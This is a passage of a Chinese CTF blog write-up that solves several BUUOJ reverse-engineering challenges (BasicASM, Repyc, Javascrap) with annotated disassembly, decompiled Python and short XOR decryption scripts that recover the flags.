<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='看前一天200分就第三了，正好好久没刷BUU，打算冲一下分，随便选几道题。[NPUCTF2020]BasicASM , [watevrCTF 2019]Repyc , [FlareOn1]Javascrap , [watevrCTF 2019]esreveR'><title>BUUOJ RE (1)</title>

<link rel='canonical' href='/post/buuoj-re-1/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='BUUOJ RE (1)'>
<meta property='og:description' content='看前一天200分就第三了，正好好久没刷BUU，打算冲一下分，随便选几道题。[NPUCTF2020]BasicASM , [watevrCTF 2019]Repyc , [FlareOn1]Javascrap , [watevrCTF 2019]esreveR'>
<meta property='og:url' content='/post/buuoj-re-1/'>
<meta property='og:site_name' content='s0uthwood&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Reverse' /><meta property='article:tag' content='BUUOJ' /><meta property='article:published_time' content='2021-05-26T23:54:09&#43;00:00'/><meta property='article:modified_time' content='2021-05-26T23:54:09&#43;00:00'/>
<meta name="twitter:title" content="BUUOJ RE (1)">
<meta name="twitter:description" content="看前一天200分就第三了，正好好久没刷BUU，打算冲一下分，随便选几道题。[NPUCTF2020]BasicASM , [watevrCTF 2019]Repyc , [FlareOn1]Javascrap , [watevrCTF 2019]esreveR">
    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf/" >
                CTF
            </a>
        
            <a href="/categories/reverse/" >
                Reverse
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/post/buuoj-re-1/">BUUOJ RE (1)</a>
    </h2>

    
    <h3 class="article-subtitle">
        看前一天200分就第三了，正好好久没刷BUU，打算冲一下分，随便选几道题。[NPUCTF2020]BasicASM , [watevrCTF 2019]Repyc , [FlareOn1]Javascrap , [watevrCTF 2019]esreveR
    </h3>
    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">May 26, 2021</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    9 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <h2 id="npuctf2020basicasm">[NPUCTF2020]BasicASM</h2>
<p>纯考察汇编的题目，有考虑想办法改成正确的汇编形式然后编译用ida看，但感觉就失去意义了，于是硬啃汇编</p>
<pre tabindex="0"><code class="language-assembly" data-lang="assembly">00007FF7A8AC5A50  push        rbp  
00007FF7A8AC5A52  push        rdi  
00007FF7A8AC5A53  sub         rsp,238h  
00007FF7A8AC5A5A  lea         rbp,[rsp+20h]  
00007FF7A8AC5A5F  mov         rdi,rsp  
00007FF7A8AC5A62  mov         ecx,8Eh  
00007FF7A8AC5A67  mov         eax,0CCCCCCCCh  
00007FF7A8AC5A6C  rep stos    dword ptr [rdi]  
00007FF7A8AC5A6E  mov         rax,qword ptr [__security_cookie (07FF7A8AD3018h)]  
00007FF7A8AC5A75  xor         rax,rbp  
00007FF7A8AC5A78  mov         qword ptr [rbp+208h],rax  
00007FF7A8AC5A7F  lea         rcx,[__06A15900_ConsoleApplication@cpp (07FF7A8AD902Ah)]  
00007FF7A8AC5A86  call        __CheckForDebuggerJustMyCode (07FF7A8AC1122h)  
00007FF7A8AC5A8B  lea         rdx,[string &quot;flag{this_is_a_fake_flag}&quot; (07FF7A8ACF450h)]  
00007FF7A8AC5A92  lea         rcx,[flag]  
00007FF7A8AC5A96  call        std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt; (07FF7A8AC15E1h)  
00007FF7A8AC5A9B  nop  
00007FF7A8AC5A9C  mov         dword ptr [p],0  
00007FF7A8AC5AA3  mov         i,0  
00007FF7A8AC5AAA  jmp         main+64h (07FF7A8AC5AB4h)  
00007FF7A8AC5AAC  mov         eax,i  
00007FF7A8AC5AAF  inc         eax  
00007FF7A8AC5AB1  mov         i,eax  
00007FF7A8AC5AB4  movsxd      rax,i  
00007FF7A8AC5AB8  mov         qword ptr [rbp+1F8h],rax  
00007FF7A8AC5ABF  lea         rcx,[flag]  
00007FF7A8AC5AC3  call        std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;::length (07FF7A8AC122Bh)  
00007FF7A8AC5AC8  mov         rcx,qword ptr [rbp+1F8h]  
00007FF7A8AC5ACF  cmp         rcx,rax  
00007FF7A8AC5AD2  jae         main+1B2h (07FF7A8AC5C02h)  ; 无符号数比较，大于或等于时跳转
00007FF7A8AC5AD8  mov         eax,i  
00007FF7A8AC5ADB  and         eax,1  ; 取最后1位
00007FF7A8AC5ADE  cmp         eax,1  ; 判断奇偶
00007FF7A8AC5AE1  jne         main+126h (07FF7A8AC5B76h)  ; 偶数跳转（不相等跳转）
00007FF7A8AC5AE7  movsxd      rax,i  
00007FF7A8AC5AEB  mov         rdx,rax  
00007FF7A8AC5AEE  lea         rcx,[flag]  
00007FF7A8AC5AF2  call        std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;::operator[] (07FF7A8AC1442h)  
00007FF7A8AC5AF7  movsx       eax,byte ptr [rax]  ; 取flag第i位
00007FF7A8AC5AFA  xor         eax,42h  ; 与0x42异或
00007FF7A8AC5AFD  mov         dword ptr [p],eax  ; 异或结果移到内存中
00007FF7A8AC5B00  mov         dl,30h  
00007FF7A8AC5B02  lea         rcx,[rbp+144h]  
00007FF7A8AC5B09  call        std::setfill&lt;char&gt; (07FF7A8AC1046h)  ; 用字符'0'进行填充
00007FF7A8AC5B0E  mov         qword ptr [rbp+1F8h],rax  
00007FF7A8AC5B15  mov         edx,2  
00007FF7A8AC5B1A  lea         rcx,[rbp+168h]  
00007FF7A8AC5B21  call        std::setw (07FF7A8AC10D2h)  ; 填充至2位
00007FF7A8AC5B26  mov         qword ptr [rbp+200h],rax  
00007FF7A8AC5B2D  lea         rdx,[std::hex (07FF7A8AC1488h)]  ; 以十六进制形式输出
00007FF7A8AC5B34  mov         rcx,qword ptr [__imp_std::cout (07FF7A8AD71C0h)]  
00007FF7A8AC5B3B  call        qword ptr [__imp_std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt; (07FF7A8AD7160h)]  
00007FF7A8AC5B41  mov         rcx,qword ptr [rbp+200h]  
00007FF7A8AC5B48  mov         rdx,rcx  
00007FF7A8AC5B4B  mov         rcx,rax  
00007FF7A8AC5B4E  call        std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,__int64&gt; (07FF7A8AC12F8h)  
00007FF7A8AC5B53  mov         rcx,qword ptr [rbp+1F8h]  
00007FF7A8AC5B5A  mov         rdx,rcx  
00007FF7A8AC5B5D  mov         rcx,rax  
00007FF7A8AC5B60  call        std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,char&gt; (07FF7A8AC11A4h)  
00007FF7A8AC5B65  mov         edx,dword ptr [p]  
00007FF7A8AC5B68  mov         rcx,rax  
00007FF7A8AC5B6B  call        qword ptr [__imp_std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt; (07FF7A8AD7158h)]  
00007FF7A8AC5B71  jmp         main+1ADh (07FF7A8AC5BFDh)  
00007FF7A8AC5B76  movsxd      rax,i  ; 偶数时跳转到这里，与奇数唯一的区别为没有异或运算
00007FF7A8AC5B7A  mov         rdx,rax  
00007FF7A8AC5B7D  lea         rcx,[flag]  
00007FF7A8AC5B81  call        std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;::operator[] (07FF7A8AC1442h)  
00007FF7A8AC5B86  movsx       eax,byte ptr [rax]  
00007FF7A8AC5B89  mov         dword ptr [p],eax  
00007FF7A8AC5B8C  mov         dl,30h  
00007FF7A8AC5B8E  lea         rcx,[rbp+194h]  
00007FF7A8AC5B95  call        std::setfill&lt;char&gt; (07FF7A8AC1046h)  
00007FF7A8AC5B9A  mov         qword ptr [rbp+1F8h],rax  
00007FF7A8AC5BA1  mov         edx,2  
00007FF7A8AC5BA6  lea         rcx,[rbp+1B8h]  
00007FF7A8AC5BAD  call        std::setw (07FF7A8AC10D2h)  
00007FF7A8AC5BB2  mov         qword ptr [rbp+200h],rax  
00007FF7A8AC5BB9  lea         rdx,[std::hex (07FF7A8AC1488h)]  
00007FF7A8AC5BC0  mov         rcx,qword ptr [__imp_std::cout (07FF7A8AD71C0h)]  
00007FF7A8AC5BC7  call        qword ptr [__imp_std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt; (07FF7A8AD7160h)]  
00007FF7A8AC5BCD  mov         rcx,qword ptr [rbp+200h]  
00007FF7A8AC5BD4  mov         rdx,rcx  
00007FF7A8AC5BD7  mov         rcx,rax  
00007FF7A8AC5BDA  call        std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,__int64&gt; (07FF7A8AC12F8h)  
00007FF7A8AC5BDF  mov         rcx,qword ptr [rbp+1F8h]  
00007FF7A8AC5BE6  mov         rdx,rcx  
00007FF7A8AC5BE9  mov         rcx,rax  
00007FF7A8AC5BEC  call        std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,char&gt; (07FF7A8AC11A4h)  
00007FF7A8AC5BF1  mov         edx,dword ptr [p]  
00007FF7A8AC5BF4  mov         rcx,rax  
00007FF7A8AC5BF7  call        qword ptr [__imp_std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt; (07FF7A8AD7158h)]  
00007FF7A8AC5BFD  jmp         main+5Ch (07FF7A8AC5AACh)  
00007FF7A8AC5C02  mov         dword ptr [rbp+1E4h],0  
00007FF7A8AC5C0C  lea         rcx,[flag]  
00007FF7A8AC5C10  call        std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;::~basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt; (07FF7A8AC1302h)  
00007FF7A8AC5C15  mov         eax,dword ptr [rbp+1E4h]  
00007FF7A8AC5C1B  mov         edi,eax  
00007FF7A8AC5C1D  lea         rcx,[rbp-20h]  
00007FF7A8AC5C21  lea         rdx,[__xt_z+540h (07FF7A8ACEFE0h)]  
00007FF7A8AC5C28  call        _RTC_CheckStackVars (07FF7A8AC1596h)  
00007FF7A8AC5C2D  mov         eax,edi  
00007FF7A8AC5C2F  mov         rcx,qword ptr [rbp+208h]  
00007FF7A8AC5C36  xor         rcx,rbp  
00007FF7A8AC5C39  call        __security_check_cookie (07FF7A8AC1190h)  
00007FF7A8AC5C3E  lea         rsp,[rbp+218h]  
00007FF7A8AC5C45  pop         rdi  
00007FF7A8AC5C46  pop         rbp  
00007FF7A8AC5C47  ret  
</code></pre><p>简单的说，过程就是一个循环，根据 <code>i</code> 的奇偶进行判断，是否与 <code>0x42</code> 进行异或，然后将结果以 2 位十六进制输出，所以只需要进行反向求解即可</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s
cipher <span style="color:#f92672">=</span> n2s(<span style="color:#ae81ff">0x662e61257b26301d7972751d6b2c6f355f3a38742d74341d61776d7d7d</span>)
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(cipher)):
    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
        print (chr(cipher[i] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x42</span>), end <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>)
    <span style="color:#66d9ef">else</span>:
        print (chr(cipher[i]), end <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>)
<span style="color:#75715e"># flag{d0_y0u_know_x86-64_a5m?}</span>
</code></pre></div><h2 id="watevrctf-2019repyc">[watevrCTF 2019]Repyc</h2>
<p>010看一眼，发现文件头好像没什么问题，直接用 <code>uncompyle6</code> 转成python文件</p>
<p>和VN的题一样，变量都成了乱码，阅读一下然后改一改</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">zero <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
one <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
two <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">function</span>(op):
    i <span style="color:#f92672">=</span> zero
    list_a <span style="color:#f92672">=</span> [zero] <span style="color:#f92672">*</span> two <span style="color:#f92672">**</span> (two <span style="color:#f92672">*</span> two) <span style="color:#75715e"># [0] * 16</span>
    list_b <span style="color:#f92672">=</span> [zero] <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>
    list_c <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">while</span> op[i][zero] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;nop&#39;</span>:
        print (i, op[i])
        cur <span style="color:#f92672">=</span> op[i][zero]<span style="color:#f92672">.</span>lower()
        args <span style="color:#f92672">=</span> op[i][one:]
        <span style="color:#66d9ef">if</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;add&#39;</span>:
            list_a[args[zero]] <span style="color:#f92672">=</span> list_a[args[one]] <span style="color:#f92672">+</span> list_a[args[two]]
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;xor&#39;</span>:
            list_a[args[zero]] <span style="color:#f92672">=</span> list_a[args[one]] <span style="color:#f92672">^</span> list_a[args[two]]
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;sub&#39;</span>:
            list_a[args[zero]] <span style="color:#f92672">=</span> list_a[args[one]] <span style="color:#f92672">-</span> list_a[args[two]]
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;mul&#39;</span>:
            list_a[args[zero]] <span style="color:#f92672">=</span> list_a[args[one]] <span style="color:#f92672">*</span> list_a[args[two]]
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;div&#39;</span>:
            list_a[args[zero]] <span style="color:#f92672">=</span> list_a[args[one]] <span style="color:#f92672">/</span> list_a[args[two]]
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;and&#39;</span>:
            list_a[args[zero]] <span style="color:#f92672">=</span> list_a[args[one]] <span style="color:#f92672">&amp;</span> list_a[args[two]]
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;or&#39;</span>:
            list_a[args[zero]] <span style="color:#f92672">=</span> list_a[args[one]] <span style="color:#f92672">|</span> list_a[args[two]]
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;nothing&#39;</span>:
            list_a[args[zero]] <span style="color:#f92672">=</span> list_a[args[zero]]
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;mov&#39;</span>:
            list_a[args[zero]] <span style="color:#f92672">=</span> args[one]
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;set_a&#39;</span>:
            list_a[args[zero]] <span style="color:#f92672">=</span> list_b[args[one]]
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;clear&#39;</span>:
            list_a[args[zero]] <span style="color:#f92672">=</span> zero
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;input_b&#39;</span>:
            list_b[args[zero]] <span style="color:#f92672">=</span> input(list_a[args[one]])
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;print_a&#39;</span>:
            print(list_a[args[zero]])
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;c_pop&#39;</span>:
            i <span style="color:#f92672">=</span> list_c<span style="color:#f92672">.</span>pop()
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;append_c&#39;</span>:
            list_a[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> zero
            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(list_a[args[zero]])):
                <span style="color:#66d9ef">if</span> list_a[args[zero]] <span style="color:#f92672">!=</span> list_a[args[one]]:
                    list_a[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> one
                    i <span style="color:#f92672">=</span> list_a[args[two]]
                    list_c<span style="color:#f92672">.</span>append(i)
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;xor_a&#39;</span>:
            str_next <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(list_a[args[zero]])):
                str_next <span style="color:#f92672">+=</span> chr(ord(list_a[args[zero]][j]) <span style="color:#f92672">^</span> list_a[args[one]])
            list_a[args[zero]] <span style="color:#f92672">=</span> str_next
        <span style="color:#66d9ef">elif</span> cur <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;sub_a&#39;</span>:
            str_next <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(list_a[args[zero]])):
                str_next <span style="color:#f92672">+=</span> chr(ord(list_a[args[zero]][j]) <span style="color:#f92672">-</span> list_a[args[one]])
            list_a[args[zero]] <span style="color:#f92672">=</span> str_next
        print (list_a)
        print (list_b)
        print (list_c)
        print ()
        i <span style="color:#f92672">+=</span> one


function(
    [
        [ <span style="color:#e6db74">&#39;mov&#39;</span>, zero, <span style="color:#e6db74">&#39;Authentication token: &#39;</span>],
        <span style="color:#75715e"># 将这个字符串放到list a的0号位置</span>
        [ <span style="color:#e6db74">&#39;input_b&#39;</span>, zero, zero],
        <span style="color:#75715e"># 将输入放到list b的0号位置</span>
        [ <span style="color:#e6db74">&#39;mov&#39;</span>, <span style="color:#ae81ff">6</span>, <span style="color:#e6db74">&#39;á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉÓÚÞÙïÉßäÉ×åáÓÜÜ</span><span style="color:#ae81ff">\x97</span><span style="color:#e6db74">ÉïÙãäãÖÓ</span><span style="color:#ae81ff">\x9a</span><span style="color:#e6db74">ÕÙÛ</span><span style="color:#ae81ff">\x99</span><span style="color:#e6db74">á×äÕà©â«³£ï²ÕÔÈ·±â¨ë&#39;</span>],
        <span style="color:#75715e"># 将这个字符串放到list a的6号位置</span>
        [ <span style="color:#e6db74">&#39;mov&#39;</span>, two, two <span style="color:#f92672">**</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> two <span style="color:#f92672">+</span> one) <span style="color:#f92672">-</span> two <span style="color:#f92672">**</span> (two <span style="color:#f92672">+</span> one)],
        <span style="color:#75715e"># 将120放到list a的2号位置</span>
        [ <span style="color:#e6db74">&#39;mov&#39;</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">15</span>],
        <span style="color:#75715e"># 将15放到list a的4号位置</span>
        [ <span style="color:#e6db74">&#39;mov&#39;</span>, <span style="color:#ae81ff">3</span>, one],
        <span style="color:#75715e"># 将1放到list a的3号位置</span>
        [ <span style="color:#e6db74">&#39;mul&#39;</span>, two, two, <span style="color:#ae81ff">3</span>],
        <span style="color:#75715e"># list a的2号位置等于2号位置*3号位置，即不变</span>
        [ <span style="color:#e6db74">&#39;add&#39;</span>, two, two, <span style="color:#ae81ff">4</span>],
        <span style="color:#75715e"># list a的2号位置等于2号位置+4号位置，即120变为135</span>
        [ <span style="color:#e6db74">&#39;nothing&#39;</span>, zero, two],
        [ <span style="color:#e6db74">&#39;clear&#39;</span>, <span style="color:#ae81ff">3</span>],
        <span style="color:#75715e"># list a的3号位置清零</span>
        [ <span style="color:#e6db74">&#39;xor_a&#39;</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>],
        <span style="color:#75715e"># 6号位置中每一个字符与3异或</span>
        [ <span style="color:#e6db74">&#39;mov&#39;</span>, zero, <span style="color:#e6db74">&#39;Thanks.&#39;</span>],
        [ <span style="color:#e6db74">&#39;mov&#39;</span>, one, <span style="color:#e6db74">&#39;Authorizing access...&#39;</span>],
        [ <span style="color:#e6db74">&#39;print_a&#39;</span>, zero],
        [ <span style="color:#e6db74">&#39;set_a&#39;</span>, zero, zero],
        [ <span style="color:#e6db74">&#39;xor_a&#39;</span>, zero, two], <span style="color:#75715e"># 输入异或135</span>
        [ <span style="color:#e6db74">&#39;sub_a&#39;</span>, zero, <span style="color:#ae81ff">4</span>], <span style="color:#75715e"># 输入减15</span>
        [ <span style="color:#e6db74">&#39;mov&#39;</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">19</span>],
        [ <span style="color:#e6db74">&#39;append_c&#39;</span>, zero, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">5</span>],
        [ <span style="color:#e6db74">&#39;print_a&#39;</span>, one],
        [ <span style="color:#e6db74">&#39;nop&#39;</span>],
        [ <span style="color:#e6db74">&#39;mov&#39;</span>, one, <span style="color:#e6db74">&#39;Access denied!&#39;</span>],
        [ <span style="color:#e6db74">&#39;print_a&#39;</span>, one],
        [ <span style="color:#e6db74">&#39;nop&#39;</span>]
    ]
)
</code></pre></div><p>将过程变量输出当作动调，就比较容易看懂每条指令在干什么了</p>
<p>最后发现有用的就是异或135和减15，猜flag头是 <code>watevr</code>，果然和密文前6个字符对上了</p>
<p>所以直接一个解密就行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉÓÚÞÙïÉßäÉ×åáÓÜÜ</span><span style="color:#ae81ff">\x97</span><span style="color:#e6db74">ÉïÙãäãÖÓ</span><span style="color:#ae81ff">\x9a</span><span style="color:#e6db74">ÕÙÛ</span><span style="color:#ae81ff">\x99</span><span style="color:#e6db74">á×äÕà©â«³£ï²ÕÔÈ·±â¨ë&#39;</span>

<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> cipher:
    print (chr((ord(c) <span style="color:#f92672">+</span> <span style="color:#ae81ff">15</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">135</span>), end <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>)
    
<span style="color:#75715e"># watevr{this_must_be_the_best_encryption_method_evr_henceforth_this_is_the_new_Advanced_Encryption_Standard_anyways_i_dont_really_have_a_good_vid_but_i_really_enjoy_this_song_i_hope_you_will_enjoy_it_aswell!_youtube.com/watch?v=E5yFcdPAGv0}</span>
</code></pre></div><h2 id="flareon1javascrap">[FlareOn1]Javascrap</h2>
<p>一开始盯着网页看了半天，找不到题目在哪儿，就看了眼别人的wp，发现文件就在图片里</p>
<p>用010editor打开，找到php文件，导出</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
	$terms<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;M&#34;</span>, <span style="color:#e6db74">&#34;Z&#34;</span>, <span style="color:#e6db74">&#34;]&#34;</span>, <span style="color:#e6db74">&#34;p&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>, <span style="color:#e6db74">&#34;f&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">&#34;v&#34;</span>, <span style="color:#e6db74">&#34;&lt;&#34;</span>, <span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;Q&#34;</span>, <span style="color:#e6db74">&#34;z&#34;</span>, <span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;s&#34;</span>, <span style="color:#e6db74">&#34;m&#34;</span>, <span style="color:#e6db74">&#34;+&#34;</span>, <span style="color:#e6db74">&#34;E&#34;</span>, <span style="color:#e6db74">&#34;D&#34;</span>, <span style="color:#e6db74">&#34;g&#34;</span>, <span style="color:#e6db74">&#34;W&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;q&#34;</span>, <span style="color:#e6db74">&#34;y&#34;</span>, <span style="color:#e6db74">&#34;T&#34;</span>, <span style="color:#e6db74">&#34;V&#34;</span>, <span style="color:#e6db74">&#34;n&#34;</span>, <span style="color:#e6db74">&#34;S&#34;</span>, <span style="color:#e6db74">&#34;X&#34;</span>, <span style="color:#e6db74">&#34;)&#34;</span>, <span style="color:#e6db74">&#34;9&#34;</span>, <span style="color:#e6db74">&#34;C&#34;</span>, <span style="color:#e6db74">&#34;P&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>, <span style="color:#e6db74">&#34;&amp;&#34;</span>, <span style="color:#e6db74">&#34;\&#39;&#34;</span>, <span style="color:#e6db74">&#34;!&#34;</span>, <span style="color:#e6db74">&#34;x&#34;</span>, <span style="color:#e6db74">&#34;G&#34;</span>, <span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>, <span style="color:#e6db74">&#34;~&#34;</span>, <span style="color:#e6db74">&#34;O&#34;</span>, <span style="color:#e6db74">&#34;h&#34;</span>, <span style="color:#e6db74">&#34;u&#34;</span>, <span style="color:#e6db74">&#34;U&#34;</span>, <span style="color:#e6db74">&#34;@&#34;</span>, <span style="color:#e6db74">&#34;;&#34;</span>, <span style="color:#e6db74">&#34;H&#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>, <span 